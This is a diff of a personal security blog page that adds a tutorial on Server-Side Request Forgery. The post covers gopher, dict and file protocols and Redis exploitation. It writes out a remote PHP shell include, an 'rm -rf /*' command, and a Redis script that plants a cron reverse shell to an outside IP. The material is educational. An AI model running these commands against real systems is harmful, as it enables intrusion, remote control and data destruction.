@@ -23,10 +23,12 @@
 <meta property="og:site_name" content="KarmA @ D0g3">
 <meta property="og:description" content="I knew little about code audit before. Now I just wanna combine these knowledge with code audit examples. It may help me have a better understandings of code audit. :)">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2018-10-28T05:32:30.693Z">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fx4kxvk2laj30pa0ai0uq.jpg">
+<meta property="og:updated_time" content="2018-11-11T17:39:07.117Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Server-Side Request Forgery In Code Audit">
 <meta name="twitter:description" content="I knew little about code audit before. Now I just wanna combine these knowledge with code audit examples. It may help me have a better understandings of code audit. :)">
+<meta name="twitter:image" content="https://ws4.sinaimg.cn/large/006tNbRwgy1fx4kxvk2laj30pa0ai0uq.jpg">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -310,6 +312,37 @@
 <p>I knew little about code audit before. Now I just wanna combine these knowledge with code audit examples. It may help me have a better understandings of code audit. :)<a id="more"></a></p>
 <the rest="" of="" contents="" |="" 余下全文="">
 
+<h2 id="0x01-Background"><a href="#0x01-Background" class="headerlink" title="0x01 Background"></a>0x01 Background</h2><h3 id="What-is-SSRF？"><a href="#What-is-SSRF？" class="headerlink" title="What is SSRF？"></a>What is SSRF？</h3><p>Before I give you the official explanation, let me show you an example. </p>
+<p>Image that the vuln web server is a worker who deliver goods outside into the company(intranet) </p>
+<p>If he/she does not check whether the goods are safe or not, it will probably cause security problems.</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNbRwgy1fx4kxvk2laj30pa0ai0uq.jpg" alt="15407049154594"></p>
+<p>Here are the official explanation: <em>Server Side Request Forgery (SSRF) refers to an attack where in an attacker is able to send a crafted request from a vulnerable web application. SSRF is usually used to target internal systems behind firewalls that are normally inaccessible to an attacker from the external network. Additionally, it’s also possible for an attacker to leverage SSRF to access services from the same server that is listening on the loopback interface (127.0.0.1).</em></p>
+<p><em>Typically Server Side Request Forgery (SSRF) occurs when a web application is making a request, where an attacker has full or partial control of the request that is being sent. A common example is when an attacker can control all or part of the URL to which the web application makes a request to some third-party service.</em></p>
+<h3 id="cURL-gt-Trick-or-Treat"><a href="#cURL-gt-Trick-or-Treat" class="headerlink" title="cURL -&gt; Trick or Treat ?"></a>cURL -&gt; Trick or Treat ?</h3><p>If vuln web server does not limit the cURL requests from accessors, it will be easily left backdoor by attckers. like this</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">'https://0akarma.me/7shell.php'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Or this</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">"rm -rf /*"</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>So, isn’t it a timely alarm bell for websites’ admin ?</p>
+<p>These are some functions about cURL. Refer to is if u need.<a href="http://www.php.net/manual/en/ref.curl.php" target="_blank" rel="noopener">cURL Functions</a> </p>
+<h2 id="0x02-Vulnerability-Type"><a href="#0x02-Vulnerability-Type" class="headerlink" title="0x02 Vulnerability Type"></a>0x02 Vulnerability Type</h2><h3 id="gopher-–-an-‘omnipotent’-protocol"><a href="#gopher-–-an-‘omnipotent’-protocol" class="headerlink" title="gopher – an ‘omnipotent’ protocol"></a>gopher – an ‘omnipotent’ protocol</h3><p>basic form <code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;</code></p>
+<p>Use your vps to listen port 2333</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure>
+<p>Then browsing <a href="http://localhost/SSRF/ssrf.php?url=gopher://your_vps_ip:2333/_gopher" target="_blank" rel="noopener">http://localhost/SSRF/ssrf.php?url=gopher://your_vps_ip:2333/_gopher</a></p>
+<p>You will receive these messages from your terminal</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@0aKarmA:~<span class="comment"># nc -lvp 2333</span></span><br><span class="line">Listening on [0.0.0.0] (family 0, port 2333)</span><br><span class="line">Connection from [your_vps_ip] port 2333 [tcp/*] accepted (family 2, sport 52130)</span><br><span class="line">gopher</span><br></pre></td></tr></table></figure>
+<h3 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h3><p><a href="http://www.dict.org/rfc2229.txt" target="_blank" rel="noopener">A Dictionary Server Protocol</a></p>
+<p>You can use this protocal to get some information about relevant port</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v ‘https://0akarma.me/ssrf.php?url=dict://ip:22/info’  <span class="comment"># This will show banner information of ssh</span></span><br><span class="line">curl -v ‘https://0akarma.me/ssrf.php?url=dict://ip:6379/info’    <span class="comment"># This will show seetings of redis</span></span><br></pre></td></tr></table></figure>
+<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><p><a href="https://msdn.microsoft.com/en-us/library/aa767731(v=vs.85" target="_blank" rel="noopener">MSDN File Protocol</a>.aspx)</p>
+<p>This is a protocal which is used to access files of the local computer.</p>
+<p>basic form <code>file:///path</code></p>
+<h3 id="http-https"><a href="#http-https" class="headerlink" title="http/https"></a>http/https</h3><p>These are used to check whether the hosts are online.</p>
+<h2 id="0x03-Vulnerability-Utilization"><a href="#0x03-Vulnerability-Utilization" class="headerlink" title="0x03 Vulnerability Utilization"></a>0x03 Vulnerability Utilization</h2><h3 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h3><h4 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h4><p>Arbitrary file write has been becoming a familiar vulnerability nowadays. Generally, redis will be run on root authority in the intranet. So it is a great chance for attckers to hack redis and even get root authority  in the intranet by gopher protocol.</p>
+<p>Now, let me show you the typical commands used to attck redis, then convert it to proper gopher protocol. Common exp is as follow:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h <span class="variable">$1</span> flushall</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">"\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1\n\n"</span>|redis-cli -h <span class="variable">$1</span> -x <span class="built_in">set</span> 1</span><br><span class="line">redis-cli -h <span class="variable">$1</span> config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> config <span class="built_in">set</span> dbfilename root</span><br><span class="line">redis-cli -h <span class="variable">$1</span> save</span><br></pre></td></tr></table></figure>
+<h4 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h4><p>If we can attck FastCGI, it must be the fault of  the admin cause the precondition of attcking fastcgi is that php-fpm port can be discoverd on the Internet. </p>
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><h4 id="Protocol-Injection"><a href="#Protocol-Injection" class="headerlink" title="Protocol Injection"></a>Protocol Injection</h4><h2 id="0x04-Bypass"><a href="#0x04-Bypass" class="headerlink" title="0x04 Bypass"></a>0x04 Bypass</h2><p>You can know more on <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">Orange Tsai research</a></p>
+<h2 id="0x05-Materials"><a href="#0x05-Materials" class="headerlink" title="0x05 Materials"></a>0x05 Materials</h2><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a><br><a href="https://github.com/Kevin-sa/SSRF_ex" target="_blank" rel="noopener">SSRF_exp</a></p>
 </the></excerpt>
       
     </div>
@@ -320,10 +353,10 @@
     <div class="copyright">
         <p><span>Title:</span><a href="/Study/SSRF.html">Server-Side Request Forgery In Code Audit</a></p>
         <p><span>Author:</span><a href="/" title="Back to Homepage">KarmA</a></p>
-        <p><span class="post-count">Words:</span>29</p>
-        <p><span class="post-count">Time:</span>1 mins</p>
+        <p><span class="post-count">Words:</span>650</p>
+        <p><span class="post-count">Time:</span>4 mins</p>
         <p><span>Created:</span>2018-10-28, 13:13:30</p>
-        <p><span>Updated:</span>2018-10-28, 13:32:30</p>
+        <p><span>Updated:</span>2018-11-12, 01:39:07</p>
         <p>
             <span>Full URL:</span><a class="post-url" href="/Study/SSRF.html" title="Server-Side Request Forgery In Code Audit">http://blog.0akarma.me/Study/SSRF.html</a>
             <span class="copy-path" data-clipboard-text="From http://blog.0akarma.me/Study/SSRF.html　　By KarmA" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
@@ -378,7 +411,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-            
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Background"><span class="toc-text">0x01 Background</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#What-is-SSRF？"><span class="toc-text">What is SSRF？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cURL-gt-Trick-or-Treat"><span class="toc-text">cURL -&gt; Trick or Treat ?</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Vulnerability-Type"><span class="toc-text">0x02 Vulnerability Type</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher-–-an-‘omnipotent’-protocol"><span class="toc-text">gopher – an ‘omnipotent’ protocol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dict"><span class="toc-text">dict</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file"><span class="toc-text">file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-https"><span class="toc-text">http/https</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Vulnerability-Utilization"><span class="toc-text">0x03 Vulnerability Utilization</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gopher"><span class="toc-text">gopher</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Redis"><span class="toc-text">Redis</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FastCGI"><span class="toc-text">FastCGI</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS"><span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Protocol-Injection"><span class="toc-text">Protocol Injection</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Bypass"><span class="toc-text">0x04 Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-Materials"><span class="toc-text">0x05 Materials</span></a></li></ol>
         
     </div>
     <style>
@@ -497,7 +530,7 @@
                     <span>| </span>
                     <span title="All Words">
                          <span><i class="fa fa-map" aria-hidden="true"></i></span>
-                        <span class="post-count"><b>86.4k</b></span>
+                        <span class="post-count"><b>87.1k</b></span>
                     </span>
                 
             </div>
